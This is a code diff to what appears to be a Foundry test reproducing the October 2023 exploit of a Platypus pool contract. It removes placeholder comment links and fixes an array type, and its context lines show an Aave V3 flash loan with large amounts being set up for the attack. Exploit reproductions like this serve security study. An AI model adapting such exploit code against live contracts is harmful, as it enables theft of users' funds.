@@ -14,10 +14,8 @@ import "./../interface.sol";
 // Vulnerable Contract Code : https://snowtrace.io/address/0xe5c84c7630a505b6adf69b5594d0ff7fedd5f447#code
 
 // @Analysis
-// Post-mortem : https://www.google.com/
 // Twitter Guy : https://twitter.com/BlockSecTeam/status/1712445197538468298
 // Twitter Guy : https://twitter.com/peckshield/status/1712354198246035562
-// Hacking God : https://www.google.com/
 
 interface IPlatypusPool {
     function deposit(address token, uint256 amount, address to, uint256 deadline) external returns (uint256);
@@ -68,7 +66,7 @@ contract ContractTest is Test {
         uint256[] memory amounts = new uint256[](2);
         amounts[0] = 1_054_969 * 1e18;
         amounts[1] = 950_996 * 1e18;
-        uint256[] memory modes = new uint[](2);
+        uint256[] memory modes = new uint256[](2);
         modes[0] = 0;
         modes[1] = 0;
         aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
